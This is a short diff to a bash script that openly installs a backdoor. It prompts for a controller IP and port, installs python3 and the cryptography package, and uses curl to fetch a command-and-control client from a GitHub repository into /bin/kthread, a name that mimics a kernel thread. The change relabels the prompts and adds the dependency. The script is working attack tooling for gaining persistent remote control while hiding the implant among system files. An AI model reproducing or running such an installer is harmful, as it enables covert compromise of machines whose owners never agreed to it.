@@ -1,11 +1,12 @@
 #!/bin/bash
 # get options from user
-read -p "Enter server IP: " server_ip
-read -p "Enter server port: " server_port
+read -p "Enter controller IP: " server_ip
+read -p "Enter controller port: " server_port
 echo "Installing backdoor... (this may take a minute)"
 
 # install dependencies
 yum install -y -q python3
+python3 -m pip install -q cryptography
 
 # download backdoor scripts
 curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /bin/kthread
